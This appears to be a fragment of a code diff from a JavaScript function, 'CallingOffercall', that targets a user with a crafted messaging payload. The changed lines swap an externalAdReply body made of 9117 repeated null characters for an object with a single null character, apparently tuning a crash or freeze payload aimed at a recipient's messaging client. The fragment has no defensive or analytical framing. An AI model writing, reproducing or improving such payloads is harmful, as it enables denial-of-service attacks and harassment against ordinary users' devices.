@@ -288,7 +288,7 @@ async function CallingOffercall(target, mention) {
       externalAdReply: {
         showAdAttribution: true,
         title: Hay,
-        body: ${"\u0000".repeat(9117)},
+        body: { text: "\u0000" },
         mediaType: 1,
         renderLargerThumbnail: false,
         thumbnailUrl: null,
